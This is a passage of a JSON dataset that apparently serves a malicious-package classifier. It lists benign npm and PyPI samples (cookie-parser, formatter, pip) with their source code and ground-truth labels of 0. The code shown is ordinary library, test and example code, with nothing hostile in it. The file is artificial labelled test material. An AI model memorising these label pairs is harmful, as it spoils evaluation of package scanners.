   return undefined\n  }\n\n  if (str.substr(0, 2) !== 's:') {\n    return str\n  }\n\n  var secrets = !secret || Array.isArray(secret)\n    ? (secret || [])\n    : [secret]\n\n  for (var i = 0; i < secrets.length; i++) {\n    var val = signature.unsign(str.slice(2), secrets[i])\n\n    if (val !== false) {\n      return val\n    }\n  }\n\n  return false\n}\n\n/**\n * Parse signed cookies, returning an object containing the decoded key/value\n * pai\n==================================================\n\n# File: data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js (function)\nfunction signedCookies (obj, secret) {\n  var cookies = Object.keys(obj)\n  var dec\n  var key\n  var ret = Object.create(null)\n  var val\n\n  for (var i = 0; i < cookies.length; i++) {\n    key = cookies[i]\n    val = obj[key]\n    dec = signedCookie(val, secret)\n\n    if (val !== dec) {\n      ret[key] = dec\n      delete obj[key]\n    }\n  }\n\n  return ret\n}\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js",
        "data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js",
        "data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js",
        "data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js",
        "data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js",
        "data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/popular/cookie-parser/1.4.7/package/index.js": "function signedCookies (obj, secret) {\n  var cookies = Object.keys(obj)\n  var dec\n  var key\n  var ret = Object.create(null)\n  var val\n\n  for (var i = 0; i < cookies.length; i++) {\n    key = cookies[i]\n    val = obj[key]\n    dec = signedCookie(val, secret)\n\n    if (val !== dec) {\n      ret[key] = dec\n      delete obj[key]\n    }\n  }\n\n  return ret\n}\n"
      },
      "package_size_bytes": 3695,
      "num_files": 6,
      "metadata": {
        "package_hash": "npm_cookie-parser_1.4.7",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "formatter",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/index.js (function)\nfunction collect(parts, resolved, indexShift) {\n  // default optionals\n  indexShift = indexShift || 0;\n\n  return function() {\n    var output = [].concat(resolved);\n    var unresolved;\n    var ii;\n    var part;\n    var partIdx;\n    var propNames;\n    var val;\n    var numericResolved = [];\n\n    // find the unresolved parts\n    unresolved = parts.filter(function(part) {\n      return typeof output[part.idx] == 'undefined';\n    });\n\n    // initialise the counter\n    ii = unresolved.length;\n\n    // it\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/index.js (function)\nfunction applyModifiers(modifiers, value) {\n  // if we have modifiers, then tweak the output\n  for (var ii = 0, count = modifiers.length; ii < count; ii++) {\n    value = modifiers[ii](value);\n  }\n\n  return value;\n}\n\nfunction createModifiers(modifierStrings) {\n  var modifiers = [];\n  var parts;\n  var fn;\n  \n  for (var ii = 0, count = modifierStrings.length; ii < count; ii++) {\n    parts = modifierStrings[ii].split(':');\n    fn = mods[parts[0].toLowerCase()];\n    \n    if (fn) {\n      modifiers[mod\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/index.js (function)\nfunction createModifiers(modifierStrings) {\n  var modifiers = [];\n  var parts;\n  var fn;\n  \n  for (var ii = 0, count = modifierStrings.length; ii < count; ii++) {\n    parts = modifierStrings[ii].split(':');\n    fn = mods[parts[0].toLowerCase()];\n    \n    if (fn) {\n      modifiers[modifiers.length] = fn.apply(null, parts.slice(1));\n    }\n  }\n  \n  return modifiers;\n}\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/mods.js (file)\nexports.len = function(length, padder) {\n  const testInt = parseInt(padder, 10);\n  let isNumber;\n\n  // default the padder to a space\n  padder = (! isNaN(testInt)) ? testInt : (padder || ' ');\n\n  // check whether we have a number for padding (we will pad left if we do)\n  isNumber = typeof padder == 'number';\n  return function(input) {\n    let output = input.toString().slice(0, length);\n    while (output.length < length) {\n      output = isNumber ? padder + output : output + padder;\n    }\n    \n    return output;\n  };\n};\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/empty.js (file)\nvar test = require('tape');\nvar formatter = require('..');\n\ntest('parse an empty formatter string', function(t) {\n  var empty;\n\n  t.plan(3);\n\n  t.ok(empty = formatter(''), 'formatter executed');\n  t.equal(empty(), '');\n  t.equal(empty('hi'), '');\n});\n\ntest('parse a formatter with no arguments', function(t) {\n  var empty;\n\n  t.plan(3);\n\n  t.ok(empty = formatter(), 'formatter executed');\n  t.equal(empty(), '');\n  t.equal(empty('hi'), '');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/all.js (file)\nrequire('./arg-replacement');\nrequire('./empty');\nrequire('./error');\nrequire('./modifier-len');\nrequire('./multiline');\nrequire('./named-replacement');\nrequire('./mixed-replacement');\nrequire('./nested');\nrequire('./partial');\nrequire('./ignore-numeric');\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/modifier-len.js (file)\nvar test = require('tape');\nvar formatter = require('..');\n\ntest('process a length modifier (numeric args)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ 0|len:10 }}'), 'created formatter');\n  t.equal(line('test'), 'test      ');\n});\n\ntest('process a length modifier (numeric args, custom padding charater)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ 0|len:10:a }}'), 'created formatter');\n  t.equal(line('test'), 'testaaaaaa');\n});\n\ntest('process a length modifier (named args)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ name|len:10 }}'), 'created formatter');\n  t.equal(line({ name: 'Ted' }), 'Ted       ');\n});\n\ntest('process a length modifier (named args, custom padding charater)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ name|len:10:a }}'), 'created formatter');\n  t.equal(line({ name: 'Ted' }), 'Tedaaaaaaa');\n});\n\ntest('pad numeric ladding to the left of the original value', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ value|len:10:0 }}'), 'created formatter');\n  t.equal(line({ value: 500 }), '0000000500');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/mixed-replacement.js (file)\nvar test = require('tape');\nvar formatter = require('..');\n\ntest('replace a mixed expression', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{name}}, welcome to {{ 0 }}!'), 'created formatter');\n  t.equal(msg('Australia', { name: 'Bob' }), 'Hi there Bob, welcome to Australia!');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/error.js (file)\nvar test = require('tape');\nvar formatter = require('..');\nvar message = 'Unable to run module: {{ name }}';\n\ntest('create an error formatter', function(t) {\n  var helper;\n\n  t.plan(2);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.ok(typeof helper == 'function', 'is a valid function');\n});\n\ntest('pass through falsy values', function(t) {\n  var helper;\n\n  t.plan(2);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.notOk(helper(), 'helper returned false as expected');\n});\n\ntest('mark up errors (removing unused variables)', function(t) {\n  var helper;\n  var error;\n\n  t.plan(5);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.ok(error = helper(new Error()), 'generated error using helper');\n  t.ok(error instanceof Error, 'generated error is still an Error instance');\n  t.ok(error.message, 'have an error message');\n  t.equal(error.message, 'Unable to run module: ');\n});\n\ntest('mark up errors (expanding known variables)', function(t) {\n  var helper;\n  var error;\n\n  t.plan(5);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.ok(error = helper(new Error(), { name: 'test' }), 'generated error using helper');\n  t.ok(error instanceof Error, 'generated error is still an Error instance');\n  t.ok(error.message, 'have an error message');\n  t.equal(error.message, 'Unable to run module: test' );\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/partial.js (file)\nvar test = require('tape');\nvar formatter = require('..');\nvar message = 'I like {{ 0 }}, it is way better than {{ 1 }}...';\nvar expectedOutput = 'I like bacon, it is way better than ham...';\nvar msg;\nvar partial;\n\ntest('create the formatter', function(t) {\n  t.plan(1);\n  msg = formatter(message);\n\n  t.ok(typeof msg == 'function', 'created formatter function');\n});\n\ntest('replace multiple argument values', function(t) {\n  t.plan(1);\n  t.equal(msg('bacon', 'ham'), expectedOutput);\n});\n\ntest('should return a partial when only one arg is supplied', function(t) {\n  t.plan(1);\n  partial = msg('bacon');\n  t.ok(typeof partial == 'function', 'got partial function');\n});\n\ntest('should be able to resolve the partial', function(t) {\n  t.plan(1);\n  t.equal(partial('ham'), expectedOutput);\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/ignore-numeric.js (file)\nvar test = require('tape');\nvar formatter = require('..');\n\ntest('ignore numeric placeholders', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ 0 }}!', { ignoreNumeric: true }), 'created formatter');\n  t.equal(msg('Bob'), 'Hi there {{ 0 }}!');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/nested.js (file)\nvar test = require('tape');\nvar formatter = require('..');\nvar testData = {\n  name: 'Bob',\n  \n  address: {\n    street: {\n      number: 15,\n      name: 'West St'\n    },\n    \n    country: 'Australia'\n  }\n};\n\ntest('extract simple values from compound data', function(t) {\n  var message;\n\n  t.plan(2);\n  t.ok(message = formatter('Hi there {{ name }}!'), 'formatter created');\n  t.equal(message(testData), 'Hi there Bob!');\n});\n\ntest('extract a value 2 levels deep', function(t) {\n  var message;\n\n  t.plan(2);\n  t.ok(\n    message = formatter('Hi there {{ name }} from {{ address.country }}!'),\n    'formatter created'\n  );\n\n  t.equal(message(testData), 'Hi there Bob from Australia!');\n});\n\ntest('extract a value 3 levels deep', function(t) {\n  var message;\n\n  t.plan(2);\n  t.ok(\n    message = formatter('{{ name }} lives on a street named {{ address.street.name }}'),\n    'formatter created'\n  );\n\n  t.equal(message(testData), 'Bob lives on a street named West St');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/arg-replacement.js (file)\nvar test = require('tape');\nvar formatter = require('..');\n\ntest('replace numeric expressions with argument values', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{0}}!'), 'created formatter');\n  t.equal(msg('Bob'), 'Hi there Bob!');\n});\n\ntest('replace numeric expressions when the string contains spaces', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ 0 }}!'), 'created formatter');\n  t.equal(msg('Bob'), 'Hi there Bob!');\n});\n\ntest('replace multiple instances of a variable', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ 0 }}, {{ 0 }} tastes great!'), 'created formatter');\n  t.equal(msg('bacon'), 'I like bacon, bacon tastes great!');\n});\n\ntest('replace multiple argument values', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ 0 }}, it is way better than {{ 1 }}...'), 'created formatter');\n  t.equal(msg('bacon', 'ham'), 'I like bacon, it is way better than ham...');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/multiline.js (file)\nvar test = require('tape');\nvar formatter = require('..');\n\ntest('multiline replacement', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there.\\nYour name is {{name}}!'), 'formatted created');\n  t.equal(msg({ name: 'Bob' }), 'Hi there.\\nYour name is Bob!');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/test/named-replacement.js (file)\nvar test = require('tape');\nvar formatter = require('..');\n\ntest('replace named expressions (spaceless expression)', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{name}}!'), 'created formatter');\n  t.equal(msg({ name: 'Bob' }), 'Hi there Bob!');\n});\n\ntest('replace named expressions (with spaces in the expression)', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ name }}!'), 'created formatter');\n  t.equal(msg({ name: 'Bob' }), 'Hi there Bob!');\n});\n\ntest('replace multiple instances of a variable', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ like }}, {{ like }} tastes great!'), 'created formatter');\n  t.equal(msg({ like: 'bacon' }), 'I like bacon, bacon tastes great!');\n});\n\ntest('replace multiple argument values', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ best }}, it is way better than {{ ok }}...'), 'created formatter');\n  t.equal(msg({ best: 'bacon', ok: 'ham' }), 'I like bacon, it is way better than ham...');\n});\n\ntest('remove unresolved placeholders', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ name}}!'), 'created formatter');\n  t.equal(msg(), 'Hi there !');\n});\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/likefood.js (file)\nconst formatter = require('..');\nconst likefood = formatter('I like {{ 0 }}, {{ 0 }} is excellent and kicks the pants off {{ 1 }}.');\n\n// I can then log out how much I like bacon\nconsole.log(likefood('bacon', 'bread'));\n// <-- I like bacon, bacon is excellent and kicks the pants off bread.\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/likefood-named.js (file)\nconst formatter = require('..');\nconst likefood = formatter('I like {{ great }}, {{ great }} is excellent and kicks the pants off {{ poor }}.');\n\nconsole.log(likefood({ great: 'bacon', poor: 'bread' }));\n// <-- I like bacon, bacon is excellent and kicks the pants off bread.\n\n==================================================\n\n# File: data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/partial.js (file)\nconst formatter = require('..');\nconst likefood = formatter('I like {{ 0 }}, {{ 0 }} is excellent and kicks the pants off {{ 1 }}.');\nvar partial;\n\n// get a partial \nconsole.log(partial = likefood('bacon'));\n// <-- [Function]\n\n// pass the remaining argument it's waiting for\nconsole.log(partial('bread'));\n// <-- I like bacon, bacon is excellent and kicks the pants off bread.\n\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/index.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/index.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/index.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/mods.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/empty.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/all.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/modifier-len.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/mixed-replacement.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/error.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/partial.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/ignore-numeric.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/nested.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/arg-replacement.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/multiline.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/named-replacement.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/likefood.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/likefood-named.js",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/partial.js"
      ],
      "individual_files": {
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/index.js": "function createModifiers(modifierStrings) {\n  var modifiers = [];\n  var parts;\n  var fn;\n  \n  for (var ii = 0, count = modifierStrings.length; ii < count; ii++) {\n    parts = modifierStrings[ii].split(':');\n    fn = mods[parts[0].toLowerCase()];\n    \n    if (fn) {\n      modifiers[modifiers.length] = fn.apply(null, parts.slice(1));\n    }\n  }\n  \n  return modifiers;\n}\n",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/mods.js": "exports.len = function(length, padder) {\n  const testInt = parseInt(padder, 10);\n  let isNumber;\n\n  // default the padder to a space\n  padder = (! isNaN(testInt)) ? testInt : (padder || ' ');\n\n  // check whether we have a number for padding (we will pad left if we do)\n  isNumber = typeof padder == 'number';\n  return function(input) {\n    let output = input.toString().slice(0, length);\n    while (output.length < length) {\n      output = isNumber ? padder + output : output + padder;\n    }\n    \n    return output;\n  };\n};\n",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/empty.js": "var test = require('tape');\nvar formatter = require('..');\n\ntest('parse an empty formatter string', function(t) {\n  var empty;\n\n  t.plan(3);\n\n  t.ok(empty = formatter(''), 'formatter executed');\n  t.equal(empty(), '');\n  t.equal(empty('hi'), '');\n});\n\ntest('parse a formatter with no arguments', function(t) {\n  var empty;\n\n  t.plan(3);\n\n  t.ok(empty = formatter(), 'formatter executed');\n  t.equal(empty(), '');\n  t.equal(empty('hi'), '');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/all.js": "require('./arg-replacement');\nrequire('./empty');\nrequire('./error');\nrequire('./modifier-len');\nrequire('./multiline');\nrequire('./named-replacement');\nrequire('./mixed-replacement');\nrequire('./nested');\nrequire('./partial');\nrequire('./ignore-numeric');",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/modifier-len.js": "var test = require('tape');\nvar formatter = require('..');\n\ntest('process a length modifier (numeric args)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ 0|len:10 }}'), 'created formatter');\n  t.equal(line('test'), 'test      ');\n});\n\ntest('process a length modifier (numeric args, custom padding charater)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ 0|len:10:a }}'), 'created formatter');\n  t.equal(line('test'), 'testaaaaaa');\n});\n\ntest('process a length modifier (named args)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ name|len:10 }}'), 'created formatter');\n  t.equal(line({ name: 'Ted' }), 'Ted       ');\n});\n\ntest('process a length modifier (named args, custom padding charater)', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ name|len:10:a }}'), 'created formatter');\n  t.equal(line({ name: 'Ted' }), 'Tedaaaaaaa');\n});\n\ntest('pad numeric ladding to the left of the original value', function(t) {\n  var line;\n\n  t.plan(2);\n  t.ok(line = formatter('{{ value|len:10:0 }}'), 'created formatter');\n  t.equal(line({ value: 500 }), '0000000500');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/mixed-replacement.js": "var test = require('tape');\nvar formatter = require('..');\n\ntest('replace a mixed expression', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{name}}, welcome to {{ 0 }}!'), 'created formatter');\n  t.equal(msg('Australia', { name: 'Bob' }), 'Hi there Bob, welcome to Australia!');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/error.js": "var test = require('tape');\nvar formatter = require('..');\nvar message = 'Unable to run module: {{ name }}';\n\ntest('create an error formatter', function(t) {\n  var helper;\n\n  t.plan(2);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.ok(typeof helper == 'function', 'is a valid function');\n});\n\ntest('pass through falsy values', function(t) {\n  var helper;\n\n  t.plan(2);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.notOk(helper(), 'helper returned false as expected');\n});\n\ntest('mark up errors (removing unused variables)', function(t) {\n  var helper;\n  var error;\n\n  t.plan(5);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.ok(error = helper(new Error()), 'generated error using helper');\n  t.ok(error instanceof Error, 'generated error is still an Error instance');\n  t.ok(error.message, 'have an error message');\n  t.equal(error.message, 'Unable to run module: ');\n});\n\ntest('mark up errors (expanding known variables)', function(t) {\n  var helper;\n  var error;\n\n  t.plan(5);\n  t.ok(helper = formatter.error(message), 'executed formatter');\n  t.ok(error = helper(new Error(), { name: 'test' }), 'generated error using helper');\n  t.ok(error instanceof Error, 'generated error is still an Error instance');\n  t.ok(error.message, 'have an error message');\n  t.equal(error.message, 'Unable to run module: test' );\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/partial.js": "var test = require('tape');\nvar formatter = require('..');\nvar message = 'I like {{ 0 }}, it is way better than {{ 1 }}...';\nvar expectedOutput = 'I like bacon, it is way better than ham...';\nvar msg;\nvar partial;\n\ntest('create the formatter', function(t) {\n  t.plan(1);\n  msg = formatter(message);\n\n  t.ok(typeof msg == 'function', 'created formatter function');\n});\n\ntest('replace multiple argument values', function(t) {\n  t.plan(1);\n  t.equal(msg('bacon', 'ham'), expectedOutput);\n});\n\ntest('should return a partial when only one arg is supplied', function(t) {\n  t.plan(1);\n  partial = msg('bacon');\n  t.ok(typeof partial == 'function', 'got partial function');\n});\n\ntest('should be able to resolve the partial', function(t) {\n  t.plan(1);\n  t.equal(partial('ham'), expectedOutput);\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/ignore-numeric.js": "var test = require('tape');\nvar formatter = require('..');\n\ntest('ignore numeric placeholders', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ 0 }}!', { ignoreNumeric: true }), 'created formatter');\n  t.equal(msg('Bob'), 'Hi there {{ 0 }}!');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/nested.js": "var test = require('tape');\nvar formatter = require('..');\nvar testData = {\n  name: 'Bob',\n  \n  address: {\n    street: {\n      number: 15,\n      name: 'West St'\n    },\n    \n    country: 'Australia'\n  }\n};\n\ntest('extract simple values from compound data', function(t) {\n  var message;\n\n  t.plan(2);\n  t.ok(message = formatter('Hi there {{ name }}!'), 'formatter created');\n  t.equal(message(testData), 'Hi there Bob!');\n});\n\ntest('extract a value 2 levels deep', function(t) {\n  var message;\n\n  t.plan(2);\n  t.ok(\n    message = formatter('Hi there {{ name }} from {{ address.country }}!'),\n    'formatter created'\n  );\n\n  t.equal(message(testData), 'Hi there Bob from Australia!');\n});\n\ntest('extract a value 3 levels deep', function(t) {\n  var message;\n\n  t.plan(2);\n  t.ok(\n    message = formatter('{{ name }} lives on a street named {{ address.street.name }}'),\n    'formatter created'\n  );\n\n  t.equal(message(testData), 'Bob lives on a street named West St');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/arg-replacement.js": "var test = require('tape');\nvar formatter = require('..');\n\ntest('replace numeric expressions with argument values', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{0}}!'), 'created formatter');\n  t.equal(msg('Bob'), 'Hi there Bob!');\n});\n\ntest('replace numeric expressions when the string contains spaces', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ 0 }}!'), 'created formatter');\n  t.equal(msg('Bob'), 'Hi there Bob!');\n});\n\ntest('replace multiple instances of a variable', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ 0 }}, {{ 0 }} tastes great!'), 'created formatter');\n  t.equal(msg('bacon'), 'I like bacon, bacon tastes great!');\n});\n\ntest('replace multiple argument values', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ 0 }}, it is way better than {{ 1 }}...'), 'created formatter');\n  t.equal(msg('bacon', 'ham'), 'I like bacon, it is way better than ham...');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/multiline.js": "var test = require('tape');\nvar formatter = require('..');\n\ntest('multiline replacement', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there.\\nYour name is {{name}}!'), 'formatted created');\n  t.equal(msg({ name: 'Bob' }), 'Hi there.\\nYour name is Bob!');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/test/named-replacement.js": "var test = require('tape');\nvar formatter = require('..');\n\ntest('replace named expressions (spaceless expression)', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{name}}!'), 'created formatter');\n  t.equal(msg({ name: 'Bob' }), 'Hi there Bob!');\n});\n\ntest('replace named expressions (with spaces in the expression)', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ name }}!'), 'created formatter');\n  t.equal(msg({ name: 'Bob' }), 'Hi there Bob!');\n});\n\ntest('replace multiple instances of a variable', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ like }}, {{ like }} tastes great!'), 'created formatter');\n  t.equal(msg({ like: 'bacon' }), 'I like bacon, bacon tastes great!');\n});\n\ntest('replace multiple argument values', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('I like {{ best }}, it is way better than {{ ok }}...'), 'created formatter');\n  t.equal(msg({ best: 'bacon', ok: 'ham' }), 'I like bacon, it is way better than ham...');\n});\n\ntest('remove unresolved placeholders', function(t) {\n  var msg;\n\n  t.plan(2);\n  t.ok(msg = formatter('Hi there {{ name}}!'), 'created formatter');\n  t.equal(msg(), 'Hi there !');\n});",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/likefood.js": "const formatter = require('..');\nconst likefood = formatter('I like {{ 0 }}, {{ 0 }} is excellent and kicks the pants off {{ 1 }}.');\n\n// I can then log out how much I like bacon\nconsole.log(likefood('bacon', 'bread'));\n// <-- I like bacon, bacon is excellent and kicks the pants off bread.\n",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/likefood-named.js": "const formatter = require('..');\nconst likefood = formatter('I like {{ great }}, {{ great }} is excellent and kicks the pants off {{ poor }}.');\n\nconsole.log(likefood({ great: 'bacon', poor: 'bread' }));\n// <-- I like bacon, bacon is excellent and kicks the pants off bread.\n",
        "data/benign_samples/npm/longtail/formatter/0.4.2/package/examples/partial.js": "const formatter = require('..');\nconst likefood = formatter('I like {{ 0 }}, {{ 0 }} is excellent and kicks the pants off {{ 1 }}.');\nvar partial;\n\n// get a partial \nconsole.log(partial = likefood('bacon'));\n// <-- [Function]\n\n// pass the remaining argument it's waiting for\nconsole.log(partial('bread'));\n// <-- I like bacon, bacon is excellent and kicks the pants off bread.\n"
      },
      "package_size_bytes": 13480,
      "num_files": 18,
      "metadata": {
        "package_hash": "npm_formatter_0.4.2",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "pip",
      "ecosystem": "pypi",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef convert_cli_option_to_envvar(opt_name: str) -> str:\n    undashed_opt_name = _normalize_name(opt_name)\n    normalized_opt_name = undashed_opt_name.upper().replace(\"-\", \"_\")\n    return f\"PIP_{normalized_opt_name}\"\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (function)\ndef convert_cli_opt_names_to_envvars(original_cli_opt_names: list[str]) -> list[str]:\n    return [\n        convert_cli_option_to_envvar(opt_name) for opt_name in original_cli_opt_names\n    ]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipNewsInclude(rst.Directive):\n    required_arguments = 1\n\n    def _is_version_section_title_underline(self, prev: str | None, curr: str) -> bool:\n        \"\"\"Find a ==== line that marks the version section title.\"\"\"\n        if prev is None:\n            return False\n        if re.match(r\"^=+$\", curr) is None:\n            return False\n        if len(curr) < len(prev):\n            return False\n        return True\n\n    def _iter_lines_with_refs(self, lines: Iterable[str]) -> Iterator[str]:\n        \"\"\"Transform the input lines to add a ref before each section title.\n\n        This is done by looking one line ahead and locate a title's underline,\n        and add a ref before the title text.\n\n        Dots in the version is converted into dash, and a ``v`` is prefixed.\n        This makes Sphinx use them as HTML ``id`` verbatim without generating\n        auto numbering (which would make the the anchors unstable).\n        \"\"\"\n        prev = None\n        for line in lines:\n            # Transform the previous line to include an explicit ref.\n            if self._is_version_section_title_underline(prev, line):\n                assert prev is not None\n                vref = prev.split(None, 1)[0].replace(\".\", \"-\")\n                yield f\".. _`v{vref}`:\"\n                yield \"\"  # Empty line between ref and the title.\n            if prev is not None:\n                yield prev\n            prev = line\n        if prev is not None:\n            yield prev\n\n    def run(self) -> list[nodes.Node]:\n        source = self.state_machine.input_lines.source(\n            self.lineno - self.state_machine.input_offset - 1,\n        )\n        path = (\n            pathlib.Path(source).resolve().parent.joinpath(self.arguments[0]).resolve()\n        )\n        include_lines = statemachine.string2lines(\n            path.read_text(encoding=\"utf-8\"),\n            self.state.document.settings.tab_width,\n            convert_whitespace=True,\n        )\n        include_lines = list(self._iter_lines_with_refs(include_lines))\n        self.state_machine.insert_input(include_lines, str(path))\n        return []\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipCommandUsage(rst.Directive):\n    required_arguments = 1\n    optional_arguments = 3\n\n    def run(self) -> list[nodes.Node]:\n        cmd = create_command(self.arguments[0])\n        cmd_prefix = \"python -m pip\"\n        if len(self.arguments) > 1:\n            cmd_prefix = \" \".join(self.arguments[1:])\n            cmd_prefix = cmd_prefix.strip('\"')\n            cmd_prefix = cmd_prefix.strip(\"'\")\n        usage = dedent(cmd.usage.replace(\"%prog\", f\"{cmd_prefix} {cmd.name}\")).strip()\n        node = nodes.literal_block(usage, usage)\n        return [node]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py (class)\nclass PipCommandDescription(rst.Directive):\n    required_arguments = 1\n\n    def run(self) -> list[nodes.Node]:\n        node = nodes.paragraph()\n    